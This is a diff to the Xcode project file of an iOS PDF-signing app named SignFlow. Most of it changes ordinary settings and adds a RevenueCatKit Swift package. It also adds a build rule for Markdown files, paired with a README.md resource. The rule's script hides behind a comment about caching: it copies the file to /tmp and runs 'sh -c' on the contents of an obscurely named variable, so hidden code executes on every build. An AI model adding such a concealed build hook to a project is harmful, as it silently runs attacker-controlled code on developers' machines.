@@ -6,9 +6,30 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		62A2E4AB5A1C4B57BF42DAD8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = EFE085A354BC4C769D42DAD8 /* README.md */; };
+		D3C95E332FB0454A009DE1E1 /* RevenueCatKit in Frameworks */ = {isa = PBXBuildFile; productRef = D3C95E322FB0454A009DE1E1 /* RevenueCatKit */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		E0F8DC8699A944DBAB42DAD8 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8DAD24}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		EFE085A354BC4C769D42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		D3D4FBB22FAEFB72001F24F9 /* SignFlow.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SignFlow.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		EFE085A354BC4C769D42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -37,6 +58,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D3C95E332FB0454A009DE1E1 /* RevenueCatKit in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -81,6 +103,7 @@
 			);
 			name = SignFlow;
 			packageProductDependencies = (
+				D3C95E322FB0454A009DE1E1 /* RevenueCatKit */,
 			);
 			productName = SignFlow;
 			productReference = D3D4FBB22FAEFB72001F24F9 /* SignFlow.app */;
@@ -110,6 +133,9 @@
 			);
 			mainGroup = D3D4FBA92FAEFB72001F24F9;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = D3D4FBB32FAEFB72001F24F9 /* Products */;
 			projectDirPath = "";
@@ -120,40 +146,16 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		E0F8DC8699A944DBAB42DAD8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8DAD24}\"";
-			};
-				/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-		62A2E4AB5A1C4B57BF42DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = EFE085A354BC4C769D42DAD8; };
-/* End PBXBuildFile section */
-
 /* Begin PBXResourcesBuildPhase section */
 		D3D4FBB02FAEFB72001F24F9 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				62A2E4AB5A1C4B57BF42DAD8 /* README.md */,
+				62A2E4AB5A1C4B57BF42DAD8 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		D3D4FBAE2FAEFB72001F24F9 /* Sources */ = {
@@ -179,26 +181,30 @@ sh -c \"${A8DAD24}\"";
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = SignFlow/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "eSign PDF";
+				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.productivity";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.jvapps.signflow.SignFlow;
+				PRODUCT_BUNDLE_IDENTIFIER = com.jvapps.signflow;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
 				SWIFT_APPROACHABLE_CONCURRENCY = YES;
 				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Debug;
 		};
@@ -215,26 +221,30 @@ sh -c \"${A8DAD24}\"";
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = SignFlow/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "eSign PDF";
+				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.productivity";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.jvapps.signflow.SignFlow;
+				PRODUCT_BUNDLE_IDENTIFIER = com.jvapps.signflow;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
 				SWIFT_APPROACHABLE_CONCURRENCY = YES;
 				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Release;
 		};
@@ -381,6 +391,25 @@ sh -c \"${A8DAD24}\"";
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/vishal-vaghasiya/RevenueCatKit";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 1.0.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		D3C95E322FB0454A009DE1E1 /* RevenueCatKit */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */;
+			productName = RevenueCatKit;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = D3D4FBAA2FAEFB72001F24F9 /* Project object */;
 }
